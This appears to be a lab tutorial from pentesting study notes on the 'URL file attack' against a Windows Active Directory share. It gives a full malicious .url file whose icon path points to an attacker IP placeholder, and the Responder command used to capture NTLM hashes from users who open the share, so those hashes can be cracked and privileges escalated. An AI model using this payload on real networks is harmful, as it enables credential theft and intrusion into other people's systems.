
If we have compromised a particular user, and that user has any sort of share access, file share access.

- we can utilize this to capture more hashes via responder
- Go back and try to crack this hashes
- Then get a user with more advanced privileges

This attack requires a compromised user account or an open file share, where you can put a file in the share.

- The content of the file contains what is shown below, whereby we will replace `x.x.x.x` with our attacker IP

```html
[InternetShortcut]
URL=http://google.com
WorkingDirectory=%username%
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

- We can then save the file as `"@test.url"` and upload it to a share (**File explorer >> Network >> HYDRA-DC >> hackme**) on your THEPUNISHER vm (This should be done in the windows system)
- Make sure **HTTP** and **SMB** is turned ON in responder. (default responder settings)

![](https://i.imgur.com/N694Qbl.png)


- Then start up responder with the command `sudo responder -I wlan0 -dwv` 
- Navigate back to that share where the file was uploaded on your THEPUNISHER vm and go back to your terminal where responder is opened, you should see the hashes dumped


![](https://i.imgur.com/LlR1nxJ.jpg)


Navigate to https://swepstopia.com/url-file-attack/ to know better




